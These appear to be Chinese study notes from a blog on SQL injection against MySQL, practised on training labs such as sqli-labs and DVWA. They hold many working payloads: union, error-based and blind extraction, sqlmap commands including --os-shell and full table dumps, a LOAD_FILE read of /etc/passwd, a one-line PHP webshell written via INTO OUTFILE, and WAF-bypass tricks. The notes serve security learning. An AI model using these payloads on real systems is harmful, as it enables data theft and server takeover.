+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">简要明确参数类型</span><br><span class="line">	数字，字符，搜索，json等  -- 搜索  like &quot;%pike%&quot;</span><br><span class="line">简要明确请求方法：</span><br><span class="line">	get,post,cookie,request,http header</span><br><span class="line">	测试使用get还是post：将参数分别以两种形式提交，如果网页是显示的一样的，则网站是post方式传参</span><br><span class="line">注意灵活使用：&#x27;&#x27; &quot;&quot; ) # --+ -- 等</span><br><span class="line">	使用burpsuit进行注入的时候，空格需要换成 + </span><br></pre></td></tr></table></figure>
+
+<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154810562.png" alt="image-20211004154810562"></p>
+<h2 id="access数据库"><a href="#access数据库" class="headerlink" title="access数据库"></a>access数据库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">没有数据库名（不存在） 表名，字段，数据</span><br><span class="line">直接使用猜，或者暴力破解</span><br></pre></td></tr></table></figure>
+
+<h1 id="mysql注入："><a href="#mysql注入：" class="headerlink" title="mysql注入："></a>mysql注入：</h1><p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154839681.png" alt="image-20211004154839681"></p>
+<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154903142.png" alt="image-20211004154903142"></p>
+<h2 id="必要知识点："><a href="#必要知识点：" class="headerlink" title="必要知识点："></a>必要知识点：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">在mysql5.0以上版本中，存在一个自带的数据库：</span><br><span class="line">	information_schema 一个存储了所有数据库名，表名，列名的数据库，相当于可以通过该数据库可以获得我们想要的信息</span><br><span class="line">数据中符号.代表下一级信息 x.y:x下的y</span><br><span class="line">	information_schema.tables:记录所有表名	-- table_schema数据库名称,table_name表名</span><br><span class="line">	information_schema.columns:记录所有列名		-- column_name列名, table_name表名</span><br><span class="line">	information_schema.schemata:记录所有数据库名 -- 字段schema_name 数据库名称</span><br><span class="line">	table_name:表名</span><br><span class="line">	column_name:列名</span><br><span class="line">	schema_name:数据库名</span><br><span class="line">limit猜解多个数据</span><br><span class="line">如何判断注入点：</span><br><span class="line">	and 1=1		页面返回正常</span><br><span class="line">	and 1=2		页面返回错误</span><br><span class="line">	可能存在注入点</span><br><span class="line">	或者：</span><br><span class="line">        http://xxx.com/xxx.php?id=2</span><br><span class="line">        http://xxx.com/xxx.php?id=3-1</span><br><span class="line">        http://xxx.com/xxx.php?id=3%2D1</span><br><span class="line">        上面三个返回的结果一样则表示存在SQL注入</span><br><span class="line"></span><br><span class="line">最好的经验去测试：</span><br><span class="line">	id=1	正常</span><br><span class="line">	id=1fajfa	错误</span><br><span class="line">	可能存在注入点</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h2 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h2></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">判断字段个数:</span><br><span class="line">http://219.153.49.228:40047/new_list.php?id=1 order by 5</span><br><span class="line">	order by 1</span><br><span class="line">	order by 2</span><br><span class="line">	order by 3</span><br><span class="line">	order by 4	以上正常</span><br><span class="line">	order by 5	开始错误</span><br><span class="line">	有5个字段</span><br><span class="line">报错猜测准备</span><br><span class="line">	.....?id=1 union select 1,2,3,4</span><br><span class="line">	.....?id=1shf union select 1,2,3,4</span><br><span class="line">	http://219.153.49.228:40047/new_list.php?id=-1 union select 1,2,3,4</span><br><span class="line">	-- 什么地方报错(显示出来的那个字段)就在那个字段进行相关的操作，比如在3这里报错了，就直接将3改成database()，.....?id=1shf select 1,2,database(),4</span><br><span class="line">信息收集：</span><br><span class="line">	数据库版本：version() 5.7.22-0ubuntu0.16.04.1</span><br><span class="line">	数据库名字：database()  mozhe_Discuz_StormGroup</span><br><span class="line">	数据库用户：user()  root@localhost</span><br><span class="line">	操作系统：@@version_compile_os</span><br></pre></td></tr></table></figure>
+
+<h2 id="一般核心步骤"><a href="#一般核心步骤" class="headerlink" title="一般核心步骤"></a>一般核心步骤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:40047/new_list.php?id=-1 union select 1,2,3,4	-- 在2,3,出显示信息</span><br><span class="line"></span><br><span class="line">查询特定数据库下的表，就是show tables</span><br><span class="line">http://219.153.49.228:40047/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema=&#x27;mozhe_Discuz_StormGroup&#x27;	-- 得到表名 StormGroup_member</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:40047/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;mozhe_Discuz_StormGroup&#x27; -- StormGroup_member,notice</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:40047/new_list.php</span><br><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;StormGroup_member&#x27; -- 得到数据中特定表的字段名 id,name,password,status</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:40047/new_list.php</span><br><span class="line">?id=-1 union select 1,group_concat(name),group_concat(password),4 from StormGroup_member</span><br><span class="line">-- </span><br><span class="line"></span><br><span class="line">获取所有的数据库名</span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-2/</span><br><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure>
+
+<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004154941058.png" alt="image-20211004154941058"></p>
+<p>文件读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">load_file() 函数</span><br><span class="line">	UNION ALL SELECT LOAD_FILE(&#x27;/etc/passwd&#x27;)-- </span><br><span class="line"></span><br><span class="line">into outerfile	into dumpfile</span><br><span class="line">	UNION SELECT “&lt;? system($_REQUEST[&#x27;cmd&#x27;]);?&gt;” INTO OUTFILE “/var/www/html/victim.com/cmd.php”-- 将一句话木马写入到目标文件里面</span><br><span class="line"></span><br><span class="line">路径常见获取方法，遗留文件，漏洞报错，平台配置文件</span><br></pre></td></tr></table></figure>
+
+<h1 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">google ： inurl .php?id= 寻找注入点</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&quot; --batch --dbms=mysql</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/mutillidae/index.php?page=user-info.php&amp;username=dg&amp;password=dgd&amp;user-info-php-submit-button=View+Account+Details&quot; --batch -p username  --dbs --users --current-user --current-db</span><br><span class="line"></span><br><span class="line">--batch 自动化完成</span><br><span class="line">-p username  --dbs --users --current-user --current-db</span><br><span class="line">(判断username是否是注入点，查询都有哪些数据库,所有用户，当前用户) </span><br><span class="line">-D wordpress --tables 指定库的所有表</span><br><span class="line">-D wordpress -T wp_users --columns 指定库的的一个表的所有字段</span><br><span class="line">--dump-all dump所有数据库的所有表</span><br><span class="line">-D wordpress -T wp_users --dump dump指定的表  (会解密加密数据，自动生成一个字典)</span><br><span class="line">-D wordpress -T wp_users -C &quot;username,password&quot; --dump dump指定的表</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; --batch</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --users</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --current-user</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --dbs</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id --current-db</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security --tables </span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security -T emails --columns </span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security -T emails --dump</span><br><span class="line">sqlmap -u &quot;http://10.16.42.229/sqli-labs-master/less-3/?id=1&quot; dbms mysql -p id -D security -T emails --dump-all</span><br></pre></td></tr></table></figure>
+
+<p>需要登录的注入点，要加上cookie，尽可能详细</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&quot; --batch --cookie=&quot;PHPSESSID:nu7gab2i5t0t8g1hbreapuhp11;security:low&quot;</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --dbms mysql -p id</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dyvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --sql-shell</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --os-shell</span><br><span class="line">sqlmap -u &quot;http://192.168.248.128/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --batch --cookie=&quot;PHPSESSID=nu7gab2i5t0t8g1hbreapuhp11;security=low&quot; --os-cmd=ls /</span><br></pre></td></tr></table></figure>
+
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>无回显的情况：可能是因为SQL语句查询方式的问题导致，这个时候需要用到相关的报错或盲注进行后续操作，</p>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">SQL注入报错用到的几个函数：</span><br><span class="line">	floor():向下取整 </span><br><span class="line">		公式：and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) -- mysql在遇到select id x, count(*) from tables group by x;这语句的时候会建立一个虚拟表(实际上就是会建立虚拟表),其中主键为x</span><br><span class="line">		floor(rand(0)*2) 一定会报错（三条以上的记录时）</span><br><span class="line">		floor(rand()*2) 不一定会报错</span><br><span class="line">	rand():在0和1之间产生一个随机数。</span><br><span class="line">	count():计数</span><br><span class="line">在使用这个函数的时候，可以直接根据公式来进行套用即可，把“你想获取数据的SQL语句”换为之前注入的一般语句即可。如下所示：</span><br><span class="line">例子：</span><br><span class="line">	http://222.18.158.243:4606/?</span><br><span class="line">	id=1 and(select 1 from (select count(*), concat(floor(rand(0)*2),0x23,0x23,(select count(*) from information_schema.columns where table_name=0x666c6167),0x23,0x23)temp from information_schema.tables group by temp )a)</span><br><span class="line">	数据库名、数据库用户名：</span><br><span class="line">	http://222.18.158.243:4606/?</span><br><span class="line">	id=1 and(select 1 from (select count(*), concat(floor(rand(0)*2),0x23,0x23,database(),0x23,0x23,user())temp from information_schema.tables group by temp )a)</span><br><span class="line">双注入：</span><br><span class="line">	公式：and (select 1 from (select count(*), concat(floor(rand(0)*2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) -- mysql在遇到select id x, count(*) from tables group by x;这语句的时候会建立一个虚拟表(实际上就是会建立虚拟表),其中主键为x 其注入原理就是，建立虚拟表的时候，主键x冲突，产生报错</span><br><span class="line">	或者：and select count(*),concat(floor(rand(0)*2),0x23,一般的SQL注入语句) a from information_schema.tables group by a --ajd</span><br><span class="line">	&#x27; and select count(*),concat(floor(rand(0)*2),0x23,databse()) as a from information_schema.tables group by a --+</span><br><span class="line">	或者，使用 将and 改为union</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(schema_name) from information_schema.schemata))x from information_schema.tables group by x )a) --+</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;))x from information_schema.tables group by x )a) --+</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;member&#x27;))x from information_schema.tables group by x )a) --+</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-5/</span><br><span class="line">?id=1&#x27; and (select 1 from (select count(*), 0x7e,concat(floor(rand(0)*2),0x23,(select group_concat(id,username,pw,sex,phonenum,address,email) from pikachu.member))x from information_schema.tables group by x )a) --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">extractvalue()：</span><br><span class="line">	MySQL中的XML函数，使用Xpath符号从xml字符串中提取值。extractvalue(目标xml文档，xml路径)</span><br><span class="line">	extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</span><br><span class="line">列子：</span><br><span class="line">	表名：</span><br><span class="line">	http://222.18.158.243:4607/?</span><br><span class="line">	id=1 and extractvalue(1,concat(0x7e,0x7e,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1)))</span><br></pre></td></tr></table></figure>
+
+<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">updatexml()：</span><br><span class="line">	MySQL中的XML函数，返回被替换的XML段。</span><br><span class="line">	updatexml(目标xml文档，xml路径，更新的内容)</span><br><span class="line">	公式:and updatexml(0x23,sql语句,1)</span><br><span class="line">		同样，这里也是使用的是and 所以需要保证前面的用户名存在</span><br><span class="line">例子：</span><br><span class="line">	http://222.18.158.243:4608/?</span><br><span class="line">	id=1 and updatexml(0x3a,concat(user(),0x3a,0x3a,database()),1)</span><br><span class="line">	http://222.18.158.243:4608/?</span><br><span class="line">	id=1 and updatexml(0x3a,concat(1,0x3a,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1)),1)</span><br><span class="line">	</span><br><span class="line">一般修改密码的时候是需要根据用户名来查询该用户是否存在，如果存在才需要修改密码，并且，修改密码的数据是如下所示的，所以，其注入点应该是在password里</span><br><span class="line">	&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
+
+<h2 id="基于时间的盲注："><a href="#基于时间的盲注：" class="headerlink" title="基于时间的盲注："></a>基于时间的盲注：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">没有任何的报错信息，只能靠时间线的长短来判断。</span><br><span class="line">length（）返回字符串的长度</span><br><span class="line">ascii()返回字符的ASCII码值</span><br><span class="line">substr(string,from,total),对string字符串进行截取，从第from个字符开始，总共截取 total个字符。</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">	IF(Condition,A,B)：当Condition为TRUE时，返回A；当Condition为FALSE时，返回B。</span><br><span class="line">   获得字段个数：3</span><br><span class="line">	http://222.18.158.243:4609/?</span><br><span class="line">	id=1 and if((select count(column_name) from information_schema.columns where table_name= &#x27;users&#x27;)=3,sleep(1),1)</span><br><span class="line">	现在通过二分法来猜测数据库的数据库名字：</span><br><span class="line">	http://222.18.158.243:4609/?</span><br><span class="line">	id=1 and if(ascii(substr(database(),1,1))&gt;0x61,sleep(1),1)</span><br><span class="line">	</span><br><span class="line">	#注意and前面的参数需要成真，才可以顺利进行盲注</span><br></pre></td></tr></table></figure>
+
+<p>benchmark()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">BENCHMARK(count,expr) 函数重复count次执行表达式expr，它可以用于计时MySQL处理表达式有多快，结果值总是0。</span><br><span class="line">其中所用到的函数：</span><br><span class="line">	length（）返回字符串的长度，</span><br><span class="line">	ascii()返回字符的ASCII码值，</span><br><span class="line">	substr(string,from,total),对string字符串进行截取，从第from个字符开始，总共截取 total个字符。</span><br><span class="line">benchmark函数和sleep类似。由测试可知，benchmark(1000000,md5(&#x27;123&#x27;))执行的时间大约是240-250ms之间。</span><br><span class="line"></span><br><span class="line">猜测数据库用户名的长度：</span><br><span class="line">	http://222.18.158.243:4610/?</span><br><span class="line">	id= 1 and if(length(user())=18,benchmark(1000000,md5(&#x27;123&#x27;)),1)</span><br><span class="line">基于bool-逻辑判断</span><br><span class="line">regexp,like,ascii,left,ord,mid</span><br><span class="line"></span><br><span class="line">基于时间的SQL盲注-延时判断:</span><br><span class="line">if sleep</span><br><span class="line"></span><br><span class="line">基于报错的SQL盲注-报错回显:</span><br><span class="line">floor,updatexml,extractvalue</span><br><span class="line">https://www.jianshu.com/p/bc35f8dd4f7c</span><br><span class="line"></span><br><span class="line">like &#x27;ro%&#x27;	判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^temp[a-z]&#x27;	匹配temp或temp...等</span><br><span class="line">if(condition,5,0)	如果条件成立返回5，否则返回0</span><br><span class="line">sleep(5)	延迟执行5秒</span><br><span class="line">mid(a,b,c)	从b位置开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c)	从位置b开始，截取字符串a的c长度</span><br><span class="line">left(database(),1),database() left(a,b)从左侧截取A的前b位</span><br><span class="line">length(database()=8)	判断数据库名的长度是否是8</span><br><span class="line">ord=ascii ascii(x)=97 判断x的ASCII码是否是97</span><br></pre></td></tr></table></figure>
+
+<h1 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h1><p>过滤了特殊符号的字符型注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)&#123;</span><br><span class="line">	$id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id);			//strip out OR (non case sensitive)</span><br><span class="line">	$id= preg_replace(&#x27;/and/i&#x27;,&quot;&quot;, $id);		//Strip out AND (non case sensitive)</span><br><span class="line">	$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">	$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);		//Strip out --</span><br><span class="line">	$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);			//Strip out #</span><br><span class="line">	$id= preg_replace(&#x27;/[\s]/&#x27;,&quot;&quot;, $id);		//Strip out spaces</span><br><span class="line">	$id= preg_replace(&#x27;/[\/\\\\]/&#x27;,&quot;&quot;, $id);		//Strip out slashes</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br><span class="line">过滤了OR,AND,*,--,#,空格,\</span><br><span class="line">找注入点</span><br><span class="line">http://222.18.158.243:4603/?id=1     #注意显示内容，WHERE id=&#x27;1&#x27;，</span><br><span class="line">http://222.18.158.243:4603/?id=1&#x27;  #无任何显示 ，注意，与第1题相比多了一个’</span><br><span class="line"></span><br><span class="line">因为有过滤，所以order by \and 等命令都不能使用。</span><br><span class="line">用o/**/rder来绕过or过滤</span><br><span class="line">用a/**/nd 来绕过and过滤，或者使ID=0来强制报错</span><br><span class="line">把注释改为；%00截断</span><br><span class="line">%a0表示空格</span><br></pre></td></tr></table></figure>
+
+<p>过滤了逗号的字符型注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">    if(stripos($id,&#x27;,&#x27;))&#123;		//stripos函数作用：查找 &quot;php&quot; 在字符串中第一次出现的位置</span><br><span class="line">      $id=&#x27;1&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      $id=$id;</span><br><span class="line">    &#125;</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br><span class="line">过滤了逗号，在注入语句中使用join函数可以绕过</span><br><span class="line">join函数：联合查询，inner join，left join，right join</span><br><span class="line">http://222.18.158.243:4604/</span><br><span class="line">?id=1&#x27; and 1=2 union select * from ((select 1)a join (select 2)b JOIN (select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 1)c)%23</span><br><span class="line">加解密注入：</span><br><span class="line">	有些时候，其参数是使用了加密之后才进行注入的</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-21/  cookie</span><br><span class="line">二次注入：</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-24/</span><br><span class="line">	先将SQL语句存入到数据库中，然后后面触发执行</span><br><span class="line">	&#x27;#</span><br><span class="line">dnslog注入漏洞(高权限)：</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-9/</span><br></pre></td></tr></table></figure>
+
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>就是多条语句同时执行的结果，在;分号后面继续输入SQL语句，进行注入。</p>
+<p><a target="_blank" rel="noopener" href="http://10.16.42.229/sqli-labs-master/Less-38/">http://10.16.42.229/sqli-labs-master/Less-38/</a></p>
+<p>一般使用堆叠注入进行数据插入</p>
+<h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><p>绕过的基本思想如下图所示：</p>
+<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004155022791.png" alt="image-20211004155022791"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">明确网站的类型：Apache+mysql？</span><br><span class="line">绕过安全狗的URL：</span><br><span class="line">    正常：?id=-1 union select 1,2,3#</span><br><span class="line">    ?id=-1 union%23a%0Aselect 1,2,3#</span><br><span class="line">    %0A 换行</span><br><span class="line">    %23 # 注释  注释后面加上一个字符，表示的是注释</span><br><span class="line">参数污染：传递相同的参数名的不同值</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-2/?id=1/**&amp;id=-1%20union%20select%201,2,3%23*/</span><br><span class="line">	/***/ mysql中的注释</span><br><span class="line">	参数污染+注释，可绕过安全狗</span><br><span class="line">修改http header来bypass waf：</span><br><span class="line">	x-forward-for</span><br><span class="line">	x-remote-IP</span><br><span class="line">	x-originating-IP</span><br><span class="line">	x-remote-addr</span><br><span class="line">	x-Real-ip</span><br><span class="line">静态资源：</span><br><span class="line">	特定的静态资源后缀请求，常见的静态文件（.js .jpg.qwf .css等），类似白名单限制机制，waf为了检测效率，不去检测这样一些文件名后缀的请求。</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-2/?id=-1 union select 1,2,3# 被拦截</span><br><span class="line">	